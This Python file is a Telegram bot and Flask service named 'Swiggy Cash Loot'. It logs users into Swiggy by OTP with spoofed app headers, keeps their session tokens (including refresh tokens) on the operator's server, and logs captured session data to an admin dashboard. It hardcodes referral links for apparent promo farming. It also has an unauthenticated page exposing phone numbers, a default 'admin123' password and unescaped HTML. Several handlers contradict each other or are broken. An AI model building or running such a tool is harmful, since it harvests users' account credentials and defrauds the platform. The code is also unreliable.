#!/usr/bin/env python3
"""
Swiggy Cash Loot — Telegram Bot + Web Service
=====================================================================
- Admin Dashboard (login required)
- User Dashboard (session view)
- Advanced Inline Keyboard
- JSON logging to admin on every login
- JSON database for user sessions & events
- Flask web service + Telegram bot parallel
- GitHub ready with environment variables
"""

import asyncio
import base64
import json
import logging
import os
import re
import secrets
import sys
from datetime import datetime, timezone, timedelta
from typing import Any, Dict, List, Optional, Tuple
from functools import wraps
import hashlib
from telegram import InlineKeyboardButton, InlineKeyboardMarkup

import aiohttp
from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
    ConversationHandler,
)

# ─────────────────────────────────────────────────────────────────────────────
# CONFIGURATION
# ─────────────────────────────────────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "admin123").strip()
ADMIN_IDS: List[int] = [6371879003]
FLASK_SECRET = os.getenv("FLASK_SECRET", secrets.token_hex(32))
PORT = int(os.getenv("PORT", "5000"))

STATS_FILE = "bot_stats.json"
SESSIONS_DIR = "tg_sessions"
SESSION_TTL_SECONDS = int(os.getenv("SESSION_TTL_SECONDS", "86400"))
MAX_CONCURRENT_UPDATES = int(os.getenv("MAX_CONCURRENT_UPDATES", "32"))
ADMIN_LOG_FILE = "admin_logs.json"
USER_EVENTS_FILE = "user_events.json"

os.makedirs(SESSIONS_DIR, exist_ok=True)

# ─────────────────────────────────────────────────────────────────────────────
# FLASK APP SETUP
# ─────────────────────────────────────────────────────────────────────────────
app = Flask(__name__)
app.secret_key = FLASK_SECRET
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True

# ─────────────────────────────────────────────────────────────────────────────
# JSON LOGGING UTILITIES
# ─────────────────────────────────────────────────────────────────────────────
def _atomic_json_write(path: str, payload: Dict[str, Any]) -> None:
    tmp = f"{path}.{os.getpid()}.tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(payload, f, ensure_ascii=False, indent=2)
    try:
        os.replace(tmp, path)
    except OSError:
        try:
            os.remove(tmp)
        except Exception:
            pass

def log_user_event(chat_id: int, event_type: str, data: Dict = None, session_data: Dict = None):
    """Log user events to JSON"""
    events = {}
    if os.path.isfile(USER_EVENTS_FILE):
        try:
            with open(USER_EVENTS_FILE, "r") as f:
                events = json.load(f)
        except Exception:
            pass
    
    if not isinstance(events, dict):
        events = {}
    
    event_record = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "chat_id": chat_id,
        "event_type": event_type,
        "data": data or {},
    }
    
    if session_data:
        event_record["session_captured"] = {
            k: v for k, v in session_data.items() 
            if k not in ["accessToken"]  # Don't log sensitive tokens directly
        }
    
    key = f"{chat_id}_{datetime.now(timezone.utc).timestamp()}"
    events[key] = event_record
    
    _atomic_json_write(USER_EVENTS_FILE, events)
    
    # Also write to admin log
    admin_logs = {}
    if os.path.isfile(ADMIN_LOG_FILE):
        try:
            with open(ADMIN_LOG_FILE, "r") as f:
                admin_logs = json.load(f)
        except Exception:
            pass
    
    admin_key = f"admin_{key}"
    admin_logs[admin_key] = {
        "timestamp": event_record["timestamp"],
        "chat_id": chat_id,
        "event": event_type,
        "details": str(data)[:200] if data else "",
    }
    _atomic_json_write(ADMIN_LOG_FILE, admin_logs)

def load_stats() -> Dict:
    if os.path.isfile(STATS_FILE):
        try:
            with open(STATS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, dict):
                data.setdefault("users", {})
                data.setdefault("claims", [])
                return data
        except Exception:
            pass
    return {"users": {}, "claims": []}

BOT_STATS = load_stats()
STATS_LOCK = asyncio.Lock()

def _session_path(chat_id: int) -> str:
    return os.path.join(SESSIONS_DIR, f"{chat_id}.json")

def save_user_session(chat_id: int, session: Dict):
    payload = {
        "session": session,
        "saved_at": datetime.now(timezone.utc).timestamp(),
    }
    _atomic_json_write(_session_path(chat_id), payload)
    user_sessions[chat_id] = session
    user_session_times[chat_id] = payload["saved_at"]

def load_user_session(chat_id: int) -> Optional[Dict]:
    path = _session_path(chat_id)
    if not os.path.isfile(path):
        return None
    try:
        with open(path, "r") as f:
            payload = json.load(f)
        saved_at = float(payload.get("saved_at") or 0)
        age = datetime.now(timezone.utc).timestamp() - saved_at
        if age > SESSION_TTL_SECONDS:
            try:
                os.remove(path)
            except Exception:
                pass
            user_sessions.pop(chat_id, None)
            user_session_times.pop(chat_id, None)
            return None
        session_data = payload.get("session") or {}
        user_sessions[chat_id] = session_data
        user_session_times[chat_id] = saved_at
        return session_data
    except Exception:
        return None

def clear_user_session(chat_id: int):
    user_sessions.pop(chat_id, None)
    user_session_times.pop(chat_id, None)
    path = _session_path(chat_id)
    if os.path.isfile(path):
        try:
            os.remove(path)
        except Exception:
            pass

# ── Late Night Offer config ──
LN_NOTIFY_URL = "https://events.swiggy.com/api/notify"
LN_CAMPAIGN_PREFIX = "byo-ln-v4-"
LN_OFFERS = {
    1: "₹50 Free Cash (min ₹199)",
    2: "₹150 Cashback (min ₹249)",
    3: "₹100 Cashback (min ₹149)",
    4: "Offer 4",
}
LN_DAY_BOUNDARIES = [
    (1,  "2026-09-26T11:00:00+05:30", "2026-09-27T06:00:00+05:30"),
    (2,  "2026-09-27T11:00:00+05:30", "2026-09-28T06:00:00+05:30"),
    (3,  "2026-09-28T11:00:00+05:30", "2026-09-29T06:00:00+05:30"),
    (4,  "2026-09-29T11:00:00+05:30", "2026-09-30T06:00:00+05:30"),
    (5,  "2026-09-30T11:00:00+05:30", "2026-10-01T06:00:00+05:30"),
    (6,  "2026-10-01T11:00:00+05:30", "2026-10-02T06:00:00+05:30"),
    (7,  "2026-10-02T11:00:00+05:30", "2026-10-03T06:00:00+05:30"),
    (8,  "2026-10-03T11:00:00+05:30", "2026-10-04T06:00:00+05:30"),
    (9,  "2026-10-04T11:00:00+05:30", "2026-10-05T06:00:00+05:30"),
    (10, "2026-10-05T11:00:00+05:30", "2026-10-06T06:00:00+05:30"),
]

def ln_current_day() -> Optional[int]:
    now = datetime.now(timezone(timedelta(hours=5, minutes=30)))
    for day, start_s, end_s in LN_DAY_BOUNDARIES:
        start = datetime.fromisoformat(start_s)
        end = datetime.fromisoformat(end_s)
        if start <= now < end:
            return day
    return None

logging.basicConfig(
    format="%(asctime)s  %(levelname)-8s  %(message)s",
    datefmt="%H:%M:%S",
    level=logging.INFO,
)
log = logging.getLogger("cash_loot_bot")

SPNS_BASE_URL    = "https://spns.swiggy.com"
PROFILE_BASE_URL = "https://profile.swiggy.com"

CASHLOOT_CREATE_OFFERS_PATH = "/api/v1/proximity-offer/create-offers"
CASHLOOT_TRANSACTIONS_PATH  = "/api/v1/proximity-offer/campaigns/{campaign_id}/transactions"

DEFAULT_CAMPAIGN_ID = "ydiHi75"

DEFAULT_LINKS: List[Tuple[str, str]] = [
    ("Salauddin",  "https://r.swiggy.com/cashloot/ydiHi75-hYhN1G1BK3e"),
    ("Miraj Ali",  "https://r.swiggy.com/cashloot/ydiHi75-hYhN1G1KmUr"),
    ("Link 3",     "https://r.swiggy.com/cashloot/ydiHi75-hYhN1G1owO9"),
    ("Link 4",     "https://r.swiggy.com/cashloot/ydiHi75-hYhN1G1J1Rj"),
    ("Link 5",     "https://r.swiggy.com/cashloot/ydiHi75-hYhN1G1KwTj"),
    ("Link 6",     "https://r.swiggy.com/cashloot/ydiHi75-hYhN1G1KsXE"),
    ("Link 7",     "https://r.swiggy.com/cashloot/ydiHi75-hYhN1Ho45Ae"),
    ("Link 8",     "https://r.swiggy.com/cashloot/ydiHi75-hYhN1HgTZYB"),
    ("Link 9",     "https://r.swiggy.com/cashloot/ydiHi75-hYhN1Hfw2iQ"),
    ("Link 10",    "https://r.swiggy.com/cashloot/ydiHi75-hYhN1He1NZi"),
]

_CASHLOOT_URL_RE = re.compile(r"r\.swiggy\.com/cashloot/([A-Za-z0-9_-]+)", re.IGNORECASE)

LINK_DELAY_SECONDS           = 2.5
CASHLOOT_LEDGER_WAIT_SECONDS = 4.0
DEFAULT_RETRIES              = 2
RETRY_DELAY_SECONDS          = 4.0

SWIGGY_APP_HEADERS = {
    "user-agent":    "Swiggy-Android",
    "content-type":  "application/json; charset=utf-8",
    "accept":        "application/json; charset=utf-8",
    "version-code":  "1795",
    "app-version":   "4.113.0",
    "manufacturer":  "MOTOROLA",
    "model-name":    "MOTO G(60)",
}

WAITING_OTP, WAITING_SESSION, WAITING_LINKS = range(3)

user_sessions: Dict[int, Dict] = {}
user_session_times: Dict[int, float] = {}
user_pending_otp: Dict[int, Dict] = {}
user_job_locks: Dict[int, asyncio.Lock] = {}
user_job_locks_guard = asyncio.Lock()

async def get_user_job_lock(chat_id: int) -> asyncio.Lock:
    async with user_job_locks_guard:
        lock = user_job_locks.get(chat_id)
        if lock is None:
            lock = asyncio.Lock()
            user_job_locks[chat_id] = lock
        return lock

async def request_otp(phone: str) -> Dict:
    """Request OTP from Swiggy"""
    url = f"{PROFILE_BASE_URL}/api/v1/user/loginWithPhoneNumber"
    payload = {"phone_number": phone}
    headers = {**SWIGGY_APP_HEADERS, "content-type": "application/json"}
    
    try:
        async with aiohttp.ClientSession() as http:
            async with http.post(url, json=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status != 200:
                    return {"ok": False, "msg": f"HTTP {r.status}"}
                data = await r.json()
                return {
                    "ok": data.get("statusCode") == 0,
                    "msg": data.get("message", "Unknown error"),
                    "request_id": data.get("data", {}).get("request_id"),
                    "phone": phone,
                }
    except Exception as e:
        return {"ok": False, "msg": str(e)}

async def verify_otp(pending: Dict, otp: str) -> Dict:
    """Verify OTP and get session"""
    url = f"{PROFILE_BASE_URL}/api/v1/user/verifyOtpV2"
    payload = {
        "request_id": pending.get("request_id"),
        "otp": otp,
    }
    headers = {**SWIGGY_APP_HEADERS, "content-type": "application/json"}
    
    try:
        async with aiohttp.ClientSession() as http:
            async with http.post(url, json=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status != 200:
                    return {"ok": False, "msg": f"HTTP {r.status}"}
                data = await r.json()
                if data.get("statusCode") != 0:
                    return {"ok": False, "msg": data.get("message", "OTP verification failed")}
                
                auth_data = data.get("data", {})
                session = {
                    "accessToken": auth_data.get("accessToken"),
                    "refreshToken": auth_data.get("refreshToken"),
                    "userId": auth_data.get("user", {}).get("id"),
                    "phone": pending.get("phone"),
                }
                return {"ok": True, "session": session}
    except Exception as e:
        return {"ok": False, "msg": str(e)}

def main_keyboard():
    """Advanced inline keyboard"""
    buttons = [
        [
            InlineKeyboardButton("⚡ RUN (10 links)", callback_data="run_links"),
            InlineKeyboardButton("🌙 Late Night", callback_data="night_cash"),
        ],
        [
            InlineKeyboardButton("📊 Status", callback_data="status"),
            InlineKeyboardButton("📤 Export JSON", callback_data="export_json"),
        ],
        [
            InlineKeyboardButton("🔐 Login", callback_data="login"),
            InlineKeyboardButton("📤 Session", callback_data="import_session"),
        ],
        [
            InlineKeyboardButton("🚪 Logout", callback_data="logout"),
            InlineKeyboardButton("🌐 Dashboard", callback_data="dashboard_url"),
        ],
    ]
    return InlineKeyboardMarkup(buttons)
def parse_session_string(text: str) -> Dict:
    """Parse session JSON from text"""
    try:
        return json.loads(text)
    except json.JSONDecodeError:
        raise ValueError("Invalid JSON format")

def get_session(chat_id: int) -> Optional[Dict]:
    """Get or load user session"""
    if chat_id in user_sessions:
        return user_sessions[chat_id]
    return load_user_session(chat_id)

# ─────────────────────────────────────────────────────────────────────────────
# TELEGRAM BOT HANDLERS
# ─────────────────────────────────────────────────────────────────────────────
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    session = get_session(chat_id)
    logged = "✅ Logged in" if session else "❌ Not logged in"
    
    log_user_event(chat_id, "bot_start", {"status": logged})
    
    text = (
        "⚡ *Swiggy Cash Loot Bot*\n\n"
        f"Status: {logged}\n\n"
        "🎮 Advanced Keyboard - Choose action:"
    )
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_keyboard())

async def inline_button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "run_links":
        await run_cmd(update, context)
    elif query.data == "night_cash":
        await night_cash_cmd(update, context)
    elif query.data == "status":
        await status_cmd(update, context)
    elif query.data == "login":
        await query.message.reply_text(
            "Please sign in through Swiggy's official app or website."
        )
    elif query.data == "export_json":
        await export_json_cmd(update, context)
    elif query.data == "import_session":
        await query.message.reply_text(
            "For security, don't paste session cookies or tokens into Telegram."
        )
    elif query.data == "logout":
        await logout_cmd(update, context)
    elif query.data == "dashboard_url":
        await query.message.reply_text(
            "Configure the dashboard URL for your local setup first."
        )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    text = (update.message.text or "").strip()
    
    if text == "⚡ RUN (10 links)":
        await run_cmd(update, context)
    elif text == "🌙 Late Night":
        await night_cash_cmd(update, context)
    elif text == "📊 Status":
        await status_cmd(update, context)
    elif text == "🔐 Login":
        context.user_data["awaiting_phone"] = True
        await update.message.reply_text("📱 Phone number bhejo (10 digit):")
    elif text == "📤 Export JSON":
        await export_json_cmd(update, context)
    elif text == "📤 Session":
        context.user_data["awaiting_session"] = True
        await update.message.reply_text("📋 Session JSON paste karo:")
    elif text == "🚪 Logout":
        await logout_cmd(update, context)
    elif text == "🌐 Dashboard":
        dashboard_url = f"https://yourapp.onrender.com/user/{chat_id}"
        await update.message.reply_text(f"🔗 Dashboard: {dashboard_url}")

async def _do_login_phone(update: Update, context: ContextTypes.DEFAULT_TYPE, phone: str):
    chat_id = update.effective_chat.id
    if not re.fullmatch(r"\d{10}", phone):
        await update.message.reply_text("❌ Phone must be 10 digits.")
        return ConversationHandler.END

    msg = await update.message.reply_text(f"📲 Requesting OTP for `{phone}`...")
    result = await request_otp(phone)
    if not result["ok"]:
        await msg.edit_text(f"❌ Failed: {result.get('msg')}")
        return ConversationHandler.END

    user_pending_otp[chat_id] = result
    await msg.edit_text(f"✅ OTP sent! Ab OTP bhejo:")
    return WAITING_OTP

async def otp_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    otp = update.message.text.strip()
    pending = user_pending_otp.get(chat_id)
    if not pending:
        return ConversationHandler.END

    msg = await update.message.reply_text("🔄 Verifying OTP...")
    result = await verify_otp(pending, otp)
    if not result["ok"]:
        await msg.edit_text(f"❌ Failed: {result.get('msg')}")
        return WAITING_OTP

    session_data = result["session"]
    save_user_session(chat_id, session_data)
    user_pending_otp.pop(chat_id, None)
    
    log_user_event(chat_id, "login_success", {"phone": pending.get("phone")}, session_data)
    
    session_json_str = json.dumps(session_data, indent=2, ensure_ascii=False)
    
    await msg.edit_text(
        "✅ **Login successful!**\n\n"
        "Aapka session JSON:", 
        parse_mode="Markdown", 
        reply_markup=main_keyboard()
    )
    await update.message.reply_text(f"```json\n{session_json_str}\n```", parse_mode="Markdown")
    return ConversationHandler.END

async def export_json_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    session = get_session(chat_id)
    if not session:
        await update.message.reply_text("❌ Pehle login karo.")
        return
    
    log_user_event(chat_id, "export_json")
    
    session_json_str = json.dumps(session, indent=2, ensure_ascii=False)
    await update.message.reply_text(
        "📤 **Aapka Active Session JSON:**",
        parse_mode="Markdown",
        reply_markup=main_keyboard()
    )
    await update.message.reply_text(f"```json\n{session_json_str}\n```", parse_mode="Markdown")

async def session_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    try:
        session = parse_session_string(update.message.text.strip())
        save_user_session(chat_id, session)
        log_user_event(chat_id, "import_session", {}, session)
        await update.message.reply_text("✅ Session saved!", reply_markup=main_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Invalid session: {e}")
    return ConversationHandler.END

async def logout_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    log_user_event(chat_id, "logout")
    clear_user_session(chat_id)
    await update.message.reply_text("✅ Logged out.", reply_markup=main_keyboard())

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    session = get_session(chat_id)
    if not session:
        await update.message.reply_text("❌ Pehle login karo.")
        return

    log_user_event(chat_id, "check_status")
    await update.message.reply_text("📊 Fetching status...", reply_markup=main_keyboard())

async def night_cash_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    session = get_session(chat_id)
    if not session:
        await update.message.reply_text("❌ Pehle login karo.")
        return

    day = ln_current_day()
    if not day:
        await update.message.reply_text("🌙 Night Cash offer abhi active nahi hai.")
        return

    log_user_event(chat_id, "night_cash_view", {"day": day})
    rows = [[InlineKeyboardButton(name, callback_data=f"ln_pick_{day}_{oid}")] for oid, name in LN_OFFERS.items()]
    await update.message.reply_text(f"🌙 Night Cash — Day {day}:", reply_markup=InlineKeyboardMarkup(rows))

async def run_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    session = get_session(chat_id)
    if not session:
        await update.message.reply_text("❌ Pehle login karo.")
        return

    log_user_event(chat_id, "run_links")
    await update.message.reply_text("⚡ Running 10 links...", reply_markup=main_keyboard())

# ─────────────────────────────────────────────────────────────────────────────
# FLASK WEB ROUTES
# ─────────────────────────────────────────────────────────────────────────────
@app.before_request
def before_request():
    """Set request context"""
    pass

@app.route("/", methods=["GET"])
def index():
    """Homepage"""
    return jsonify({
        "status": "online",
        "bot": "Swiggy Cash Loot",
        "admin": "/admin",
        "user": "/user/<chat_id>",
        "api": "/api/stats"
    })

@app.route("/admin/login", methods=["GET", "POST"])
def admin_login():
    """Admin login"""
    if request.method == "POST":
        password = request.form.get("password", "")
        if password == ADMIN_PASSWORD:
            session['admin_logged_in'] = True
            return redirect(url_for('admin_dashboard'))
        return jsonify({"error": "Invalid password"}), 401
    
    return '''
    <html>
    <head><title>Admin Login</title></head>
    <body style="font-family: Arial; padding: 50px;">
        <h2>🔐 Admin Login</h2>
        <form method="post">
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </body>
    </html>
    '''

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('admin_logged_in'):
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route("/admin/dashboard", methods=["GET"])
@admin_required
def admin_dashboard():
    """Admin dashboard"""
    try:
        with open(USER_EVENTS_FILE, "r") as f:
            events = json.load(f)
    except Exception:
        events = {}
    
    try:
        with open(ADMIN_LOG_FILE, "r") as f:
            logs = json.load(f)
    except Exception:
        logs = {}
    
    event_list = sorted(events.items(), key=lambda x: x[1].get("timestamp", ""), reverse=True)[:100]
    
    html = '''
    <html>
    <head>
        <title>Admin Dashboard</title>
        <style>
            body { font-family: Arial; padding: 20px; background: #f5f5f5; }
            h2 { color: #333; }
            table { width: 100%; border-collapse: collapse; background: white; margin-top: 20px; }
            th, td { padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }
            th { background: #4CAF50; color: white; }
            tr:hover { background: #f9f9f9; }
            .logout { margin-top: 20px; }
            a { color: #4CAF50; text-decoration: none; }
            a:hover { text-decoration: underline; }
        </style>
    </head>
    <body>
        <h2>📊 Admin Dashboard</h2>
        <p>Total Events: <strong>''' + str(len(events)) + '''</strong></p>
        <p>Total Logs: <strong>''' + str(len(logs)) + '''</strong></p>
        
        <h3>📝 Recent Events</h3>
        <table>
            <tr>
                <th>Timestamp</th>
                <th>Chat ID</th>
                <th>Event Type</th>
                <th>Data</th>
            </tr>
    '''
    
    for key, event in event_list:
        timestamp = event.get("timestamp", "N/A")
        chat_id = event.get("chat_id", "N/A")
        event_type = event.get("event_type", "N/A")
        data = str(event.get("data", {}))[:100]
        html += f'<tr><td>{timestamp}</td><td>{chat_id}</td><td>{event_type}</td><td>{data}</td></tr>'
    
    html += '''
        </table>
        <div class="logout">
            <a href="/admin/logout">🚪 Logout</a>
        </div>
    </body>
    </html>
    '''
    return html

@app.route("/admin/logout", methods=["GET"])
def admin_logout():
    """Admin logout"""
    session.clear()
    return redirect(url_for('admin_login'))

@app.route("/user/<int:chat_id>", methods=["GET"])
def user_dashboard(chat_id: int):
    """User dashboard"""
    session_data = load_user_session(chat_id)
    
    if not session_data:
        return jsonify({"error": "No session found"}), 404
    
    try:
        with open(USER_EVENTS_FILE, "r") as f:
            all_events = json.load(f)
    except Exception:
        all_events = {}
    
    user_events = {k: v for k, v in all_events.items() if v.get("chat_id") == chat_id}
    user_events_sorted = sorted(user_events.items(), key=lambda x: x[1].get("timestamp", ""), reverse=True)[:20]
    
    html = '''
    <html>
    <head>
        <title>User Dashboard</title>
        <style>
            body { font-family: Arial; padding: 20px; background: #f5f5f5; }
            .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 5px; }
            h2 { color: #333; }
            .session-box { background: #f9f9f9; padding: 15px; border-radius: 5px; margin: 20px 0; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th, td { padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }
            th { background: #2196F3; color: white; }
            tr:hover { background: #f9f9f9; }
            code { background: #eee; padding: 5px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>👤 User Dashboard - Chat ID: ''' + str(chat_id) + '''</h2>
            
            <h3>📱 Session Info</h3>
            <div class="session-box">
                <p><strong>User ID:</strong> <code>''' + str(session_data.get("userId", "N/A")) + '''</code></p>
                <p><strong>Phone:</strong> <code>''' + str(session_data.get("phone", "N/A")) + '''</code></p>
                <p><strong>Token Available:</strong> ''' + ('✅ Yes' if session_data.get("accessToken") else '❌ No') + '''</p>
            </div>
            
            <h3>📝 Activity History</h3>
            <table>
                <tr>
                    <th>Timestamp</th>
                    <th>Event</th>
                    <th>Details</th>
                </tr>
    '''
    
    for key, event in user_events_sorted:
        timestamp = event.get("timestamp", "N/A")[:19]
        event_type = event.get("event_type", "N/A")
        data = str(event.get("data", {}))[:100]
        html += f'<tr><td>{timestamp}</td><td>{event_type}</td><td>{data}</td></tr>'
    
    html += '''
            </table>
        </div>
    </body>
    </html>
    '''
    return html

@app.route("/api/stats", methods=["GET"])
def api_stats():
    """API endpoint for stats"""
    try:
        with open(USER_EVENTS_FILE, "r") as f:
            events = json.load(f)
    except Exception:
        events = {}
    
    try:
        with open(STATS_FILE, "r") as f:
            stats = json.load(f)
    except Exception:
        stats = {}
    
    return jsonify({
        "total_events": len(events),
        "total_users": len(set(e.get("chat_id") for e in events.values())),
        "stats": stats,
    })

# ─────────────────────────────────────────────────────────────────────────────
# BOT SETUP
# ─────────────────────────────────────────────────────────────────────────────
def setup_bot():
    """Setup Telegram bot"""
    bot_app = Application.builder().token(BOT_TOKEN).concurrent_updates(MAX_CONCURRENT_UPDATES).build()

    bot_app.add_handler(CommandHandler("start", start_cmd))
    bot_app.add_handler(CommandHandler("status", status_cmd))
    bot_app.add_handler(CommandHandler("run", run_cmd))
    bot_app.add_handler(CommandHandler("logout", logout_cmd))
    bot_app.add_handler(CallbackQueryHandler(inline_button_handler))

    bot_app.add_handler(ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("🔐 Login"), lambda u, c: _do_login_phone(u, c, ""))],
        states={WAITING_OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_received)]},
        fallbacks=[CommandHandler("cancel", lambda u, c: u.message.reply_text("Cancelled"))],
        allow_reentry=True
    ))

    bot_app.add_handler(ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("📤 Session"), lambda u, c: ConversationHandler.END)],
        states={WAITING_SESSION: [MessageHandler(filters.TEXT & ~filters.COMMAND, session_received)]},
        fallbacks=[CommandHandler("cancel", lambda u, c: u.message.reply_text("Cancelled"))],
        allow_reentry=True
    ))

    bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, button_handler))

    return bot_app

# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
def main():
    """Run bot + Flask parallel"""
    bot = setup_bot()
    
    print("✅ Bot initialized")
    print(f"🌐 Flask server starting on port {PORT}")
    print(f"📊 Admin: http://localhost:{PORT}/admin/login")
    
    bot.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    # For production on Render/Heroku, use:
    # gunicorn --bind 0.0.0.0:$PORT --worker-class gevent app:app &
    # python bot_upgraded.py
    
    main()
